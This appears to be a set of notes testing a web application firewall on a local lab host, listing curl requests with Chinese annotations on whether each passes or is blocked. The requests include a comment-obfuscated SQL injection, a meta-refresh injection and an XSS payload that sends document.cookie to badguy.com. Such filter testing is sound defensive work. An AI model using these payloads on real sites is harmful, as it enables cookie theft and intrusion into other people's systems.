curl http://192.168.99.101/xss/                        通过
curl http://192.168.99.101/xss/?id=40/**/and/**/1=1    通过，因为配置到白名单
curl http://192.168.99.101/xss/?name=40/**/and/**/1=1  不通过，含有条件注入   SQL 经典注入方法
curl http://192.168.99.101/xss/?name=%28%29            不通过，特殊字符
curl http://192.168.99.101/xss/?term=%3Cscript%3Ewindow.open%28%22http://badguy.com?cookie=%22+document.cookie%29%3C/script%3E
                                                   不通过，参数内容含脚本注入
curl http://192.168.99.101/xss/?title=meta%20http-equiv=%22refresh%22%20content=%220;%22